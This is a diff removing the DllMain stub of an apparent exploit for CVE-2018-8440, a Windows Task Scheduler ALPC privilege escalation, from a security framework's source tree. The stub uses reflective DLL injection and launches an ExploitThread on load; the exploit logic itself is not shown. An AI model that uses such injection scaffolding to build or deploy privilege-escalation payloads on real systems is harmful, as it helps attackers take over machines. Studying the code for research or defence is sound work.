--- external/source/exploits/CVE-2018-8440/ALPC-TaskSched-LPE/dllmain.cpp
@@ -1,37 +1,0 @@
-#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
-
-//===============================================================================================//
-// This is a stub for the actuall functionality of the DLL.
-//===============================================================================================//
-#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
-
-// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
-// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
-// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.
-
-// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
-extern HINSTANCE hAppInstance;
-//===============================================================================================//
-#include "stdafx.h"
-#include "Header.h"
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
-{
-	BOOL bReturnValue = TRUE;
-	switch (dwReason)
-	{
-	case DLL_QUERY_HMODULE:
-		if (lpReserved != NULL)
-			*(HMODULE *)lpReserved = hAppInstance;
-		break;
-	case DLL_PROCESS_ATTACH:
-		hAppInstance = hinstDLL;
-		MessageBox(0, L"In DLLMain", L"Status", MB_OK);
-		CreateThread(NULL, 0, ExploitThread, hinstDLL, 0, NULL);
-		break;
-	case DLL_PROCESS_DETACH:
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-		break;
-	}
-	return bReturnValue;
-}
